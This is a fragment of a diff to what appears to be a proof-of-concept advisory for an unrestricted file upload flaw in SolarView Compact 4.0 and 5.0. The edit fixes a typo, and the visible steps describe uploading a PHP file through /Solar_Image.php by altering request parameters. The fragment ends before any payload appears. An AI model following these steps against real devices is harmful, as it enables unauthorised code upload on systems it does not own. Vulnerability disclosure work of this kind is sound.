@@ -7,7 +7,7 @@ Unrestricted File Upload vulnerability in SolarView Compact 4.0,5.0 at /Solar_Im
 ## POC
 
 1. navigate to /Solar_Image.php
-2. ulpad any php file and caputre the request
+2. upload any php file and caputre the request
 3. update the `userfile` and `upfilename` parameters like this:
 ```
 -----------------------------168287165333758025211172961484
